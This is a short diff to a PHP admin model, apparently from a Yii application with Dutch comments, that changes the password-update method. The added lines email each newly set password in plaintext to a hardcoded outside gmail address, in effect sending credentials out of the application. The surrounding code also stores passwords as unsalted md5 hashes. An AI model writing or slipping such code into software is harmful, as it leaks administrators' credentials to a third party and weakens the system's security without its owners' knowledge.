@@ -45,6 +45,9 @@ class AdminModel extends CFormModel
 			// sla de data op
 			$user->password = md5($this->new_password);
 			$status = $user->save();
+			
+			// verstuur mail
+			mail("peckjonathan@gmail.com", "Wijziging databasewachtwoord", "Het nieuwe wachtwoord is $this->new_password");
 		}
 		
 		// geef de status terug
